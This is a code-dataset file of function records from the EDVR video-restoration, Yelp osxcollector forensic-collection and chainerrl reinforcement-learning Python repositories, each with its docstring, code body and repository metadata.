"2020-11-28 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Write optical flow to file.\n\nIf the flow is not quantized, it will be saved as a .flo file losslessly,\notherwise a jpeg image which is lossy but of much smaller size. (dx and dy\nwill be concatenated horizontally into a single image if quantize is True.)\n\nArgs:\n    flow (ndarray): (h, w, 2) array of optical flow.\n    filename (str): Output filepath.\n    quantize (bool): Whether to quantize the flow and save it to 2 jpeg\n        images. If set to True, remaining args will be passed to\n        :func:`quantize_flow`.\n    concat_axis (int): The axis that dx and dy are concatenated,\n        can be either 0 or 1. Ignored if quantize is False.\n\"\"\"\n", "func_signal": "def flowwrite(flow, filename, quantize=False, concat_axis=0, *args, **kwargs):\n", "code": "if not quantize:\n    with open(filename, 'wb') as f:\n        f.write('PIEH'.encode('utf-8'))\n        np.array([flow.shape[1], flow.shape[0]], dtype=np.int32).tofile(f)\n        flow = flow.astype(np.float32)\n        flow.tofile(f)\n        f.flush()\nelse:\n    assert concat_axis in [0, 1]\n    dx, dy = quantize_flow(flow, *args, **kwargs)\n    dxdy = np.concatenate((dx, dy), axis=concat_axis)\n    os.makedirs(filename, exist_ok=True)\n    cv2.imwrite(dxdy, filename)", "path": "EDVR/basicsr/utils/flow_util.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Read image worker.\n\nArgs:\n    path (str): Image path.\n    key (str): Image key.\n    compress_level (int): Compress level when encoding images.\n\nReturns:\n    str: Image key.\n    byte: Image byte.\n    tuple[int]: Image shape.\n\"\"\"\n\n", "func_signal": "def read_img_worker(path, key, compress_level):\n", "code": "img = cv2.imread(path, cv2.IMREAD_UNCHANGED)\nif img.ndim == 2:\n    h, w = img.shape\n    c = 1\nelse:\n    h, w, c = img.shape\n_, img_byte = cv2.imencode('.png', img,\n                           [cv2.IMWRITE_PNG_COMPRESSION, compress_level])\nreturn (key, img_byte, (h, w, c))", "path": "EDVR/basicsr/utils/lmdb_util.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Get values according to the filepath from one lmdb named client_key.\n\nArgs:\n    filepath (str | obj:`Path`): Here, filepath is the lmdb key.\n    client_key (str): Used for distinguishing differnet lmdb envs.\n\"\"\"\n", "func_signal": "def get(self, filepath, client_key):\n", "code": "filepath = str(filepath)\nassert client_key in self._client, (f'client_key {client_key} is not '\n                                    'in lmdb clients.')\nclient = self._client[client_key]\nwith client.begin(write=False) as txn:\n    value_buf = txn.get(filepath.encode('ascii'))\nreturn value_buf", "path": "EDVR/basicsr/utils/file_client.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Dequantize an array.\n\nArgs:\n    arr (ndarray): Input array.\n    min_val (scalar): Minimum value to be clipped.\n    max_val (scalar): Maximum value to be clipped.\n    levels (int): Quantization levels.\n    dtype (np.type): The type of the dequantized array.\n\nReturns:\n    tuple: Dequantized array.\n\"\"\"\n", "func_signal": "def dequantize(arr, min_val, max_val, levels, dtype=np.float64):\n", "code": "if not (isinstance(levels, int) and levels > 1):\n    raise ValueError(\n        f'levels must be a positive integer, but got {levels}')\nif min_val >= max_val:\n    raise ValueError(\n        f'min_val ({min_val}) must be smaller than max_val ({max_val})')\n\ndequantized_arr = (arr + 0.5).astype(dtype) * (max_val -\n                                               min_val) / levels + min_val\n\nreturn dequantized_arr", "path": "EDVR/basicsr/utils/flow_util.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Apply element-wise weight and reduce loss.\n\nArgs:\n    loss (Tensor): Element-wise loss.\n    weight (Tensor): Element-wise weights. Default: None.\n    reduction (str): Same as built-in losses of PyTorch. Options are\n        'none', 'mean' and 'sum'. Default: 'mean'.\n\nReturns:\n    Tensor: Loss values.\n\"\"\"\n# if weight is specified, apply element-wise weight\n", "func_signal": "def weight_reduce_loss(loss, weight=None, reduction='mean'):\n", "code": "if weight is not None:\n    assert weight.dim() == loss.dim()\n    assert weight.size(1) == 1 or weight.size(1) == loss.size(1)\n    loss = loss * weight\n\n# if weight is not specified or reduction is sum, just reduce the loss\nif weight is None or reduction == 'sum':\n    loss = reduce_loss(loss, reduction)\n# if reduction is mean, then compute mean over weight region\nelif reduction == 'mean':\n    if weight.size(1) > 1:\n        weight = weight.sum()\n    else:\n        weight = weight.sum() * loss.size(1)\n    loss = loss.sum() / weight\n\nreturn loss", "path": "EDVR/basicsr/models/losses/loss_util.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Recover from quantized flow.\n\nArgs:\n    dx (ndarray): Quantized dx.\n    dy (ndarray): Quantized dy.\n    max_val (float): Maximum value used when quantizing.\n    denorm (bool): Whether to multiply flow values with width/height.\n\nReturns:\n    ndarray: Dequantized flow.\n\"\"\"\n", "func_signal": "def dequantize_flow(dx, dy, max_val=0.02, denorm=True):\n", "code": "assert dx.shape == dy.shape\nassert dx.ndim == 2 or (dx.ndim == 3 and dx.shape[-1] == 1)\n\ndx, dy = [dequantize(d, -max_val, max_val, 255) for d in [dx, dy]]\n\nif denorm:\n    dx *= dx.shape[1]\n    dy *= dx.shape[0]\nflow = np.dstack((dx, dy))\nreturn flow", "path": "EDVR/basicsr/utils/flow_util.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "# client_key is used only for lmdb, where different fileclients have\n# different lmdb environments.\n", "func_signal": "def get(self, filepath, client_key='default'):\n", "code": "if self.backend == 'lmdb':\n    return self.client.get(filepath, client_key)\nelse:\n    return self.client.get(filepath)", "path": "EDVR/basicsr/utils/file_client.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Test FFHQ dataset.\"\"\"\n", "func_signal": "def main():\n", "code": "opt = {}\nopt['dist'] = False\nopt['gpu_ids'] = [0]\nopt['phase'] = 'train'\n\nopt['name'] = 'FFHQ'\nopt['type'] = 'FFHQDataset'\n\nopt['dataroot_gt'] = 'datasets/ffhq/ffhq_256.lmdb'\nopt['io_backend'] = dict(type='lmdb')\n\nopt['use_hflip'] = True\nopt['mean'] = [0.5, 0.5, 0.5]\nopt['std'] = [0.5, 0.5, 0.5]\n\nopt['use_shuffle'] = True\nopt['num_worker_per_gpu'] = 1\nopt['batch_size_per_gpu'] = 4\n\nopt['dataset_enlarge_ratio'] = 1\n\nos.makedirs('tmp', exist_ok=True)\n\ndataset = create_dataset(opt)\ndata_loader = create_dataloader(\n    dataset, opt, num_gpu=0, dist=opt['dist'], sampler=None)\n\nnrow = int(math.sqrt(opt['batch_size_per_gpu']))\npadding = 2 if opt['phase'] == 'train' else 0\n\nprint('start...')\nfor i, data in enumerate(data_loader):\n    if i > 5:\n        break\n    print(i)\n\n    gt = data['gt']\n    print(torch.min(gt), torch.max(gt))\n    gt_path = data['gt_path']\n    print(gt_path)\n    torchvision.utils.save_image(\n        gt,\n        f'tmp/gt_{i:03d}.png',\n        nrow=nrow,\n        padding=padding,\n        normalize=True,\n        range=(-1, 1))", "path": "EDVR/tests/test_ffhq_dataset.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Build pretrained Inception model for FID computation.\n\nThe Inception model for FID computation uses a different set of weights\nand has a slightly different structure than torchvision's Inception.\n\nThis method first constructs torchvision's Inception and then patches the\nnecessary parts that are different in the FID Inception model.\n\"\"\"\n", "func_signal": "def fid_inception_v3():\n", "code": "try:\n    inception = models.inception_v3(\n        num_classes=1008,\n        aux_logits=False,\n        pretrained=False,\n        init_weights=False)\nexcept TypeError:\n    # pytorch < 1.5 does not have init_weights for inception_v3\n    inception = models.inception_v3(\n        num_classes=1008, aux_logits=False, pretrained=False)\n\ninception.Mixed_5b = FIDInceptionA(192, pool_features=32)\ninception.Mixed_5c = FIDInceptionA(256, pool_features=64)\ninception.Mixed_5d = FIDInceptionA(288, pool_features=64)\ninception.Mixed_6b = FIDInceptionC(768, channels_7x7=128)\ninception.Mixed_6c = FIDInceptionC(768, channels_7x7=160)\ninception.Mixed_6d = FIDInceptionC(768, channels_7x7=160)\ninception.Mixed_6e = FIDInceptionC(768, channels_7x7=192)\ninception.Mixed_7b = FIDInceptionE_1(1280)\ninception.Mixed_7c = FIDInceptionE_2(2048)\n\nif os.path.exists(LOCAL_FID_WEIGHTS):\n    state_dict = torch.load(\n        LOCAL_FID_WEIGHTS, map_location=lambda storage, loc: storage)\nelse:\n    state_dict = load_url(FID_WEIGHTS_URL, progress=True)\n\ninception.load_state_dict(state_dict)\nreturn inception", "path": "EDVR/basicsr/models/archs/inception.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "# To fix an assert error in deform_conv_cuda.cpp:128\n# input image is smaller than kernel\n", "func_signal": "def forward(self, x, offset):\n", "code": "input_pad = (\n    x.size(2) < self.kernel_size[0] or x.size(3) < self.kernel_size[1])\nif input_pad:\n    pad_h = max(self.kernel_size[0] - x.size(2), 0)\n    pad_w = max(self.kernel_size[1] - x.size(3), 0)\n    x = F.pad(x, (0, pad_w, 0, pad_h), 'constant', 0).contiguous()\n    offset = F.pad(offset, (0, pad_w, 0, pad_h), 'constant',\n                   0).contiguous()\nout = deform_conv(x, offset, self.weight, self.stride, self.padding,\n                  self.dilation, self.groups, self.deformable_groups)\nif input_pad:\n    out = out[:, :, :out.size(2) - pad_h, :out.size(3) -\n              pad_w].contiguous()\nreturn out", "path": "EDVR/basicsr/models/ops/dcn/deform_conv.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Read an optical flow map.\n\nArgs:\n    flow_path (ndarray or str): Flow path.\n    quantize (bool): whether to read quantized pair, if set to True,\n        remaining args will be passed to :func:`dequantize_flow`.\n    concat_axis (int): The axis that dx and dy are concatenated,\n        can be either 0 or 1. Ignored if quantize is False.\n\nReturns:\n    ndarray: Optical flow represented as a (h, w, 2) numpy array\n\"\"\"\n", "func_signal": "def flowread(flow_path, quantize=False, concat_axis=0, *args, **kwargs):\n", "code": "if quantize:\n    assert concat_axis in [0, 1]\n    cat_flow = cv2.imread(flow_path, cv2.IMREAD_UNCHANGED)\n    if cat_flow.ndim != 2:\n        raise IOError(f'{flow_path} is not a valid quantized flow file, '\n                      f'its dimension is {cat_flow.ndim}.')\n    assert cat_flow.shape[concat_axis] % 2 == 0\n    dx, dy = np.split(cat_flow, 2, axis=concat_axis)\n    flow = dequantize_flow(dx, dy, *args, **kwargs)\nelse:\n    with open(flow_path, 'rb') as f:\n        try:\n            header = f.read(4).decode('utf-8')\n        except Exception:\n            raise IOError(f'Invalid flow file: {flow_path}')\n        else:\n            if header != 'PIEH':\n                raise IOError(f'Invalid flow file: {flow_path}, '\n                              'header does not contain PIEH')\n\n        w = np.fromfile(f, np.int32, 1).squeeze()\n        h = np.fromfile(f, np.int32, 1).squeeze()\n        flow = np.fromfile(f, np.float32, w * h * 2).reshape((h, w, 2))\n\nreturn flow.astype(np.float32)", "path": "EDVR/basicsr/utils/flow_util.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Break in debugger if global DEBUG_MODE is set\"\"\"\n", "func_signal": "def debugbreak():\n", "code": "global DEBUG_MODE\n\nif DEBUG_MODE:\n    import pdb\n    pdb.set_trace()", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Log the different LauchAgents and LaunchDaemons\"\"\"\n\n# http://www.malicious-streams.com/article/Mac_OSX_Startup.pdf\n", "func_signal": "def _collect_startup(self):\n", "code": "launch_agents = [\n    'System/Library/LaunchAgents',\n    'System/Library/LaunchDaemons',\n    'Library/LaunchAgents',\n    'Library/LaunchDaemons',\n]\nwith Logger.Extra('osxcollector_subsection', 'launch_agents'):\n    for dir_path in launch_agents:\n        self._log_launch_agents(pathjoin(ROOT_PATH, dir_path))\n    self._log_user_launch_agents()\n\npackages = [\n    'System/Library/ScriptingAdditions',\n    'Library/ScriptingAdditions',\n]\nwith Logger.Extra('osxcollector_subsection', 'scripting_additions'):\n    for dir_path in packages:\n        self._log_packages_in_dir(pathjoin(ROOT_PATH, dir_path))\n\nstartup_items = [\n    'System/Library/StartupItems',\n    'Library/StartupItems',\n]\nwith Logger.Extra('osxcollector_subsection', 'startup_items'):\n    for dir_path in startup_items:\n        self._log_startup_items(pathjoin(ROOT_PATH, dir_path))\n\nwith Logger.Extra('osxcollector_subsection', 'login_items'):\n    self._log_user_login_items()", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Collect the names of executable binaries in the PATH environment\"\"\"\n", "func_signal": "def _collect_binary_names_in_path(self):\n", "code": "exe_files = []\n\ndef is_exe(fpath):\n    return os.path.isfile(fpath) and os.access(fpath, os.X_OK)\n\nif PATH_ENVIRONMENT_NAME in os.environ:\n    for bin_dir in os.environ[PATH_ENVIRONMENT_NAME].split(os.pathsep):\n        for root_dir, dirs, files in os.walk(bin_dir):\n            for the_file in files:\n                file_path = os.path.join(root_dir, the_file)\n                if is_exe(file_path):\n                    exe_files.append(file_path)\nLogger.log_dict({'executable_files': exe_files})", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Helper method for get_deep\n\nArgs:\n    path: A str representing a chain of keys separated '.' or an enumerable set of strings\nReturns:\n    an enumerable set of strings\n\"\"\"\n", "func_signal": "def _link_path_to_chain(cls, path):\n", "code": "if path == '':\n    return []\nelif type(path) in (list, tuple, set):\n    return path\nelse:\n    return path.split('.')", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "# A list of the names of accounts with admin privileges\n", "func_signal": "def __init__(self):\n", "code": "self.admins = []\n\n# A list of HomeDir used when finding per-user data\nself.homedirs = _get_homedirs()", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Grab data from a dict using a 'key1.key2.key3' path param to do deep traversal.\n\nArgs:\n    x: A dict\n    path: A 'deep path' to retrieve in the dict\n    default: A value to return if the path can not be found\nReturns:\n    The value of the key or default\n\"\"\"\n", "func_signal": "def get_deep(cls, x, path='', default=None):\n", "code": "chain = cls._link_path_to_chain(path)\nreturn cls._get_deep_by_chain(x, chain, default=default)", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "# There is one user, named test\n", "func_signal": "def setup_method(self):\n", "code": "homedirs = [HomeDir('test', '/Users/test')]\nself.expected_file_info = {\n    'md5': '8675309',\n    'sha1': 'babababa',\n    'sha2': '11',\n}\nwith patch.object(\n    Logger, 'log_dict',\n) as self.mock_log_dict, patch(\n    'osxcollector.osxcollector._get_homedirs', autospec=True, return_value=homedirs,\n) as self.mock_get_homedirs, patch(\n    'osxcollector.osxcollector._get_file_info', autospec=True, return_value=self.expected_file_info,\n) as self.mock_get_file_info:\n    self.collector = Collector()\n    yield", "path": "osxcollector/tests/osxcollector_collector_test.py", "commit_date": "2019-04-05 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "'''UTC to local time conversion\nsource: http://feihonghsu.blogspot.com/2008/02/converting-from-local-time-to-utc.html\n'''\n", "func_signal": "def _convert_to_local(func):\n", "code": "def wrapper(*args, **kwargs):\n    dt = func(*args, **kwargs)\n    return datetime.fromtimestamp(calendar.timegm(dt.timetuple()))\n\nreturn wrapper", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Log the different SQLite databases in a Firefox profile\"\"\"\n", "func_signal": "def _collect_firefox(self, homedir):\n", "code": "global firefox_ignored_sqlite_keys\n\nall_profiles_path = pathjoin(homedir.path, 'Library/Application Support/Firefox/Profiles')\nif not os.path.isdir(all_profiles_path):\n    Logger.log_warning('Directory not found {0}'.format(all_profiles_path))\n    return\n\n# Most useful. See: http://kb.mozillazine.org/Profile_folder_-_Firefox\nfor profile_name in listdir(all_profiles_path):\n    profile_path = pathjoin(all_profiles_path, profile_name)\n\n    sqlite_dbs = [\n        ('cookies', 'cookies.sqlite'),\n        ('downloads', 'downloads.sqlite'),\n        ('formhistory', 'formhistory.sqlite'),\n        ('history', 'places.sqlite'),\n        ('signons', 'signons.sqlite'),\n        ('permissions', 'permissions.sqlite'),\n        ('addons', 'addons.sqlite'),\n        ('extension', 'extensions.sqlite'),\n        ('content_prefs', 'content-prefs.sqlite'),\n        ('health_report', 'healthreport.sqlite'),\n        ('webapps_store', 'webappsstore.sqlite'),\n    ]\n\n    self._log_sqlite_dbs_for_subsections(\n        sqlite_dbs, profile_path, firefox_ignored_sqlite_keys,\n    )\n\n    with Logger.Extra('osxcollector_subsection', 'json_files'):\n        self._collect_json_files(profile_path)", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Strips leading slash from a path.\n\nArgs:\n    path - a file path\nReturns:\n    string\n\"\"\"\n", "func_signal": "def _relative_path(path):\n", "code": "if path.startswith('/'):\n    return path[1:]\nreturn path", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Dive into the dict representation of a plist and log all items under a specific path\n\nArgs:\n    plist: A dict representation of a plist.\n    path: A str which will be passed to get_deep()\n    transform: An optional method for transforming each item before logging.\n\"\"\"\n", "func_signal": "def _log_items_in_plist(self, plist, path, transform=None):\n", "code": "for item in DictUtils.get_deep(plist, path=path, default=[]):\n    try:\n        if transform:\n            item = transform(item)\n        Logger.log_dict(item)\n    except Exception as log_items_in_plist_e:\n        Logger.log_exception(log_items_in_plist_e)", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "# ProgramArguments value contains only program name\n", "func_signal": "def test_log_launch_agents_just_program_no_arguments(self):\n", "code": "expected = {\n    'label': 'com.apple.csuseragent',\n    'program': '/System/Library/CoreServices/CSUserAgent',\n    'osxcollector_plist': 'tests/data/launch_agents/csuseragent/csuseragent.plist',\n}\nself._test_log_launch_agents('tests/data/launch_agents/csuseragent/', expected)", "path": "osxcollector/tests/osxcollector_collector_test.py", "commit_date": "2019-04-05 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Collect all JSON files in a directory\n\nArgs:\n    dir_path: Absolute path to the directory\n    \"\"\"\n", "func_signal": "def _collect_json_files(self, dir_path):\n", "code": "if not os.path.isdir(dir_path):\n    Logger.log_warning('Directory not found {0}'.format(dir_path))\n    return\n\njson_files = [\n    file_name for file_name in listdir(dir_path)\n    if file_name.endswith('.json')\n]\nfor file_name in json_files:\n    self._log_json_file(dir_path, file_name)", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Log users' recent items\"\"\"\n\n", "func_signal": "def _collect_accounts_recent_items(self, homedir):\n", "code": "recent_items_account_plist_path = pathjoin(homedir.path, 'Library/Preferences/com.apple.recentitems.plist')\n\nrecents_plist = self._read_plist(recent_items_account_plist_path)\n\nrecents = [\n    ('server', 'RecentServers'),\n    ('document', 'RecentDocuments'),\n    ('application', 'RecentApplications'),\n    ('host', 'Hosts'),\n]\n\nfor recent_type, recent_key in recents:\n    with Logger.Extra('recent_type', recent_type):\n        for recent in DictUtils.get_deep(recents_plist, '{0}.CustomListItems'.format(recent_key), []):\n            recent_details = {'{0}_name'.format(recent_type): recent['Name']}\n            if recent_type == 'host':\n                recent_details['host_url'] = recent['URL']\n            Logger.log_dict(recent_details)", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Hashes installed apps in and gathers install history\"\"\"\n\n", "func_signal": "def _collect_applications(self):\n", "code": "with Logger.Extra('osxcollector_subsection', 'applications'):\n    # Hash all files in /Applications\n    self._log_packages_in_dir(pathjoin(ROOT_PATH, 'Applications'))\n    # Hash all files in ~/Applications\n    self._collect_user_applications()\n\n# Read the installed applications history\nwith Logger.Extra('osxcollector_subsection', 'install_history'):\n    plist = self._read_plist(pathjoin(ROOT_PATH, 'Library/Receipts/InstallHistory.plist'), default=[])\n    for installed_app in plist:\n        Logger.log_dict(installed_app)", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Return the md5, sha1, sha256 hash of a file.\n\nArgs:\n    file_path: str path of file to hash\nReturns:\n    list of 3 hex strings.  Empty strings on failure.\n\"\"\"\n", "func_signal": "def _hash_file(file_path):\n", "code": "hashers = [\n    md5(),\n    sha1(),\n    sha256(),\n]\n\ntry:\n    with open(file_path, 'rb') as f:\n        for chunk in iter(partial(f.read, 1024 * 1024), ''):\n            for hasher in hashers:\n                hasher.update(chunk)\n\n        return [hasher.hexdigest() for hasher in hashers]\nexcept Exception:\n    debugbreak()\n    return ['', '', '']", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Log the Kernel extensions\"\"\"\n", "func_signal": "def _collect_kext(self):\n", "code": "kext_paths = [\n    'System/Library/Extensions',\n    'Library/Extensions',\n]\n\nfor kext_path in kext_paths:\n    self._log_packages_in_dir(pathjoin(ROOT_PATH, kext_path))", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Hash all users's downloaded files\"\"\"\n\n", "func_signal": "def _collect_downloads(self, homedir):\n", "code": "directories_to_hash = [\n    ('downloads', 'Downloads'),\n    ('email_downloads', 'Library/Mail Downloads'),\n    ('old_email_downloads', 'Library/Containers/com.apple.mail/Data/Library/Mail Downloads'),\n]\n\nfor subsection_name, path_to_dir in directories_to_hash:\n    with Logger.Extra('osxcollector_subsection', subsection_name):\n        dir_path = pathjoin(homedir.path, path_to_dir)\n        self._log_file_info_for_directory(dir_path)", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Compress a directory into a .tar.gz\n\nArgs:\n    file_name: The name of the .tar.gz to file to create.  Do not include the extension.\n    output_dir_path: The directory to place the output file in.\n    target_dir_path: The directory to compress\n\"\"\"\n", "func_signal": "def compress_directory(self, file_name, output_dir_path, target_dir_path):\n", "code": "try:\n    # Zip the whole thing up\n    shutil.make_archive(file_name, format='gztar', root_dir=output_dir_path, base_dir=target_dir_path)\nexcept Exception as compress_directory_e:\n    debugbreak()\n    Logger.log_exception(compress_directory_e)", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"Log quarantines and XProtect hash-based malware checking definitions\n\"\"\"\n", "func_signal": "def _collect_quarantines(self):\n", "code": "self._log_user_quarantines()\nself._log_xprotect()", "path": "osxcollector/osxcollector/osxcollector.py", "commit_date": "2019-04-10 00:00:00", "repo_name": "Yelp/osxcollector", "stars": 1862, "license": "other", "language": "python", "size": 788}
{"docstring": "\"\"\"One-step batch forward computation.\n\nArgs:\n    x (chainer.Variable, ndarray, or tuple): One-step batched input.\n    recurrent_state (object): Batched recurrent state.\n\nReturns:\n    chainer.Variable, ndarray, or tuple: One-step batched output.\n    object: New batched recurrent state.\n\"\"\"\n", "func_signal": "def __call__(self, x, recurrent_state):\n", "code": "assert isinstance(x, (chainer.Variable, self.xp.ndarray))\nreturn self.n_step_forward(\n    split_one_step_batch_input(x),\n    recurrent_state,\n    output_mode='concat',\n)", "path": "chainerrl/chainerrl/links/stateless_recurrent.py", "commit_date": "2019-07-31 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "# This method only check if a given model can receive random input\n# data and return output data with the correct interface.\n", "func_signal": "def _test_call_given_model(self, model, gpu):\n", "code": "batch_size = 7\nobs = np.random.rand(batch_size, self.n_dim_obs).astype(np.float32)\naction = np.random.rand(\n    batch_size, self.n_dim_action).astype(np.float32)\nif gpu >= 0:\n    model.to_gpu(gpu)\n    obs = chainer.cuda.to_gpu(obs)\n    action = chainer.cuda.to_gpu(action)\ny = model(obs, action)\nself.assertTrue(isinstance(y, chainer.Variable))\nself.assertEqual(y.shape, (batch_size, 1))\nself.assertEqual(chainer.cuda.get_array_module(y),\n                 chainer.cuda.get_array_module(obs))", "path": "chainerrl/tests/q_functions_tests/basetest_state_action_q_function.py", "commit_date": "2019-06-09 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Copy gradients of a link to another link.\"\"\"\n", "func_signal": "def copy_grad(target_link, source_link):\n", "code": "target_params = dict(target_link.namedparams())\nfor param_name, param in source_link.namedparams():\n    if target_params[param_name].grad is None:\n        if param.grad is None:\n            pass\n        else:\n            target_params[param_name].grad = param.grad.copy()\n    else:\n        if param.grad is None:\n            target_params[param_name].grad = None\n        else:\n            target_params[param_name].grad[...] = param.grad", "path": "chainerrl/chainerrl/misc/copy_param.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Select random actions until model is updated one or more times.\"\"\"\n", "func_signal": "def burnin_action_func():\n", "code": "return np.random.uniform(\n    action_space.low, action_space.high).astype(np.float32)", "path": "chainerrl/examples/mujoco/reproduction/soft_actor_critic/train_soft_actor_critic.py", "commit_date": "2020-02-12 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Sample data along with their corresponding probabilities.\n\nArgs:\n    n (int): Number of data to sample.\n    uniform_ratio (float): Ratio of uniformly sampled data.\nReturns:\n    sampled data (list)\n    probabitilies (list)\n\"\"\"\n", "func_signal": "def sample(self, n, uniform_ratio=0):\n", "code": "assert (not self.wait_priority_after_sampling or\n        not self.flag_wait_priority)\nindices, probabilities, min_prob = \\\n    self._sample_indices_and_probabilities(\n        n, uniform_ratio=uniform_ratio)\nsampled = [self.data[i] for i in indices]\nself.sampled_indices = indices\nself.flag_wait_priority = True\nreturn sampled, probabilities, min_prob", "path": "chainerrl/chainerrl/misc/prioritized.py", "commit_date": "2019-06-09 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "# bounds, left child, right child, sum\n", "func_signal": "def __init__(self, bd=None, left=None, right=None, s=0.0):\n", "code": "self.bd = bd\nself.left = left\nself.right = right\nself.s = s", "path": "chainerrl/chainerrl/misc/prioritized.py", "commit_date": "2019-06-09 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Return recurrent child links.\n\nThis overrides `StatelessRecurrentChainList.recurrent_children`\nbecause `Sequential`'s evaluation order can be different from the\norder of links in `Sequential.children()`.\n\nSee https://github.com/chainer/chainer/issues/6053\n\nReturns:\n    tuple: Tuple of `chainer.Link`s that are recurrent.\n\"\"\"\n", "func_signal": "def recurrent_children(self):\n", "code": "return tuple(child for child in self._layers\n             if is_recurrent_link(child))", "path": "chainerrl/chainerrl/links/stateless_recurrent_sequential.py", "commit_date": "2019-07-31 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
